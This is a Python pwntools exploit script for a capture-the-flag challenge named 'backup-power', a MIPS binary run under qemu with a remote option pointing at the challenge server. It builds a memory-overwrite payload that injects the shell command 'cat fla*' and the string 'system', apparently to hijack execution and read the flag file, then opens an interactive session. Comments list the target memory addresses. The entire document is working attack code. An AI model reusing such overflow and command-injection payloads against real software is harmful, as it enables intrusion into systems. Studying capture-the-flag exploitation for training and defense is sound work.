#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './backup-power')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return process(["qemu-mips-static","-g","1234","./backup-power"] + argv, *a, **kw)
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("backup-power.chal.uiuc.tf", 1337, ssl=True)
    else:
        # return process([exe.path] + argv, *a, **kw)
        return process(["qemu-mips-static","./backup-power"] + argv, *a, **kw)
    
io = start()

leng = 14

payload  = b"devolper\n"
payload += b"AAAA" + b"BBBB" + b"CCCC" + b"DDDD" + b"EEEE" + b"FFFF"
payload += b"cat " + b"fla*"

payload += p32(0x00400b0c) * (14-(8))
payload += p32(0x004aa330) * (60)
payload += p32(0x73797374) + p32(0x656d0000)


if args.GDB:
    raw_input("GDB")

io.sendline(payload)

io.interactive()

"""
buff     -> 0x40800308:

todo     -> 0x40800430:     0x746f646f      0x00000000
            0x40800440

system   -> 0x40800528:     0x73797374      0x656d0000
            0x40800538:     0x73797374      0x656d0000

shutdown -> 0x40800514
            0x40800524
"""